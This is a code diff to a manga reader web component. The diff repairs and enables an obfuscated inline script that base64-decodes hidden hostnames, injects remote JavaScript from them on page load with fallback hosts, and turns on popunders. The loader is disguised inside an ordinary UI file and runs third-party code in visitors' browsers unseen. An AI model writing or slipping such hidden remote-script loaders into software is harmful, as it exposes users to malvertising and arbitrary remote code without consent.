@@ -166,15 +166,14 @@ export function MangaReader({
               (function(){
                 var i=window,x="dc9d8b8dbc262cb0af9d8a1ae5b28785",m=
                 [["siteId",186*51+180*146+568+5277143],["minBid",0],
-                ["popundersPerIP","0"],["delayBetween",0],["default",false],
+                ["popundersPerIP","1"],["delayBetween",0],["default",false],
                 ["defaultPerDay",0],["topmostLayer","auto"]],j=
-                "d3d3LmJ1dHRlcmFkc3IzdGVtLmNvbS9obGF2ZS5jc3M=",
-                "ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvaG92
-                Ymt1dGUubWIuLmpz",b=-1,o,e,c=function(){clearTimeout(e);b++;
+                ["d3d3LmJ1dHRlcmFkc3IzdGVtLmNvbS9obGF2ZS5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvaG92Ymt1dGUubWIuLmpz"],
+                b=-1,o,e,c=function(){clearTimeout(e);b++;
                 if(j[b]&&!(1810235297000<(new Date).getTime()&&1<b))
                 {o=i.document.createElement("script");o.type="text/javascript";
-                o.async=!0;var p=i.document.getElementsByTagName("script")
-                [0];o.src="https://"+atob(j[b]);o.crossOrigin="anonymous";
+                o.async=!0;var p=i.document.getElementsByTagName("script")[0];
+                o.src="https://"+atob(j[b]);o.crossOrigin="anonymous";
                 o.onerror=c;o.onload=function(){clearTimeout(e);
                 i[x.slice(0,16)]||c()};e=setTimeout(c,5E3);
                 p.parentNode.insertBefore(o,p)}else{if(!i[x])
